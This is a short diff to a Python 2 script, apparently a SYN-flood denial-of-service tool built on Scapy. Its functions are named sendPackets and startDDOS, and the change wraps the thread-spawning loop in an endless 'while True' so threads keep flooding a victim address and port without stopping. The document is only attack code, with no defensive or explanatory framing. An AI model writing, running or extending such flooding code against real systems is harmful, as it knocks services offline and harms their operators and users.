@@ -13,12 +13,14 @@ def sendPackets(victimAddress,victimPort):
             #ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
             sr1(packetSYN)
 
+    return
 
 def startDDOS(victimAddress,victimPort,numThreads):
-    for i in range(1,numThreads):
-        print "Creating thread: %s" % i
-        thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
-        thread.start()
+    while True:
+        for i in range(1,numThreads):
+            print "Creating thread: %s" % i
+            thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
+            thread.start()
 
 
 def createRandomString():
